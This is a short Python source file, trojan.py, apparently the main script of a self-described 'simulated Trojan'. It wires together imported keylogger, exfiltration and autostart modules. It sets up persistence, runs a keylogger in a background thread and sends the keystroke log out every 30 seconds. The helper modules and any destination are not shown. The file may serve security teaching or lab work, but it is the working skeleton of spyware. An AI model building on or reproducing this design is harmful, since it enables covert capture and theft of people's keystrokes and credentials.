# trojan.py — main script combining keylogger, exfil, and persistence simulation

import threading
import time

from modules import keylogger
from modules import exfil
from modules import autostart

def main():
    print("[*] Starting simulated Trojan...")

    # 1. Simulate persistence
    autostart.simulate_persistence()

    # 2. Start keylogger in background thread
    keylog_thread = threading.Thread(target=keylogger.start_logging)
    keylog_thread.daemon = True
    keylog_thread.start()

    # 3. (Optional) Periodic exfiltration
    while True:
        try:
            time.sleep(30)  # exfil every 30 sec
            exfil.send_keylog()
        except KeyboardInterrupt:
            print("[!] Exiting...")
            break

if __name__ == "__main__":
    main()